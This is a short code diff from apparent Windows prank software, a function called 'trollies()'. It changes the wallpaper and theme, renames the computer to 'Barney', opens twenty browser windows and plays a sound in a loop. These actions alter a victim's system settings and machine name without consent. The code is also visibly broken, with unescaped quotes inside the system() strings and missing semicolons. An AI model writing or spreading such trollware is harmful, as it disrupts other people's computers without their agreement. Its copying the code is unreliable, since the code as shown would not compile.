@@ -136,7 +136,7 @@ void trollies()
         );
 
     // Change wallpaper
-    system("reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "wallpaper.jpg" /f")
+    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"wallpaper.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 
     // Change scheme to b&w
     system("powershell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0")
@@ -145,11 +145,14 @@ void trollies()
     SetComputerNameEx(ComputerNamePhysicalNetBIOS, L"Barney");
 
     //Opens browser
-    for (int i = 0; i < 20; i++)
+    for (int i = 0; i < 20; i++) 
+    {
     system("start https://www.google.com/search?q=barney+is+looking+for+you")
+    }
 
     // Plays barney music
-    for (int i = 0; i < 20; i++) {
+    for (int i = 0; i < 20; i++) 
+    {
     PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
     }
 
